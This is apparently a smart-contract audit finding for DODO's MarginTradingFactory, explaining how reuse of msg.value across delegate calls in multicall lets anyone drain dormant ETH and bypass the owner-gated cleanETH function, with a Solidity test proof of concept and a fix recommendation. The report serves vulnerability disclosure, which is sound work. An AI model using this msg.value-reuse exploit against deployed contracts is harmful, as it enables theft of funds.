# Anyone can bypass the owner-gated `cleanETH()` and drain the dormant ETH from MarginTradingFactory

## Summary
Anyone can drain the dormant ETH from MarginTradingFactory and bypass owner-gated functions.

## Vulnerability Detail
`MarginTradingFactory` has defined **owner-gated** methods such as [cleanToken](https://github.com/sherlock-audit/2023-05-dodo/blob/main/dodo-margin-trading-contracts/contracts/marginTrading/MarginTradingFactory.sol#L217) and [cleanETH](https://github.com/sherlock-audit/2023-05-dodo/blob/main/dodo-margin-trading-contracts/contracts/marginTrading/MarginTradingFactory.sol#L225) to rescue dormant funds from the contract.
However using combination of multicall and any payable function from factory, anyone can drain dormant ETH from the contract.

This is possible due to the nature of multicall, `msg.sender` and `msg.value` both persist in case of delegate calls, hence one can do multicall with some "X" amount of ETH as value, execute action 1 with "X" as value and then execute action 2 with "X" as value again.
For action 1 the initial eth passed to multicall is used, for action 2 the contract's funds are used.

### POC 
```solidity
MarginTradingFactoryTest.sol

    function testMulticallDrainETH() public {
        // consider that there is 5 eth dormant inside the factory contract
        address(marginTradingFactory).call{value: 5 ether}("");
        assertEq(address(marginTradingFactory).balance, 5 ether);
      
        // atleast 2 margin accounts are required
        address account1 = marginTradingFactory.createMarginTrading(2, new bytes(0), new bytes(0));
   
        // attack
        bytes memory call= abi.encodeWithSelector(marginTradingFactory.depositMarginTradingETH.selector, account1, false, uint8(2));
        
        bytes[] memory payload = new bytes[](2);
        payload[0] = call;
        payload[1] = call;
        marginTradingFactory.multicall{value: 5 ether}(payload);
       
        assertEq(address(marginTradingFactory).balance, 0 ether);
    }
```

## Recommendation
Consider removing multicall from the factory contract and use it externally, like uniswap for example.
Unnecessary delegate calls are never a good practice
